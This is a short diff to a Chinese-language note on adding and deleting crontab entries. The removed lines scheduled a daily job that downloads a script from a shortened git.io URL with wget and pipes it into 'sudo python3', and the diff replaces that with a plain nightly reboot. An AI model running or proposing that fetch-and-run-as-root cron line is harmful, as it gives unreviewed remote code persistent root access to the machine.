@@ -11,11 +11,11 @@ tags:
 ## 添加
 
 ```bash
-crontab -l | sed '1i\0 0 * * * wget -qO- git.io/i18n-python | sudo python3' | crontab
+crontab -l | sed '1i\0 0 * * * reboot' | crontab
 ```
 
 ## 删除
 
 ```bash
-crontab -l | sed /i18n-python/d | crontab
+crontab -l | sed /reboot/d | crontab
 ```
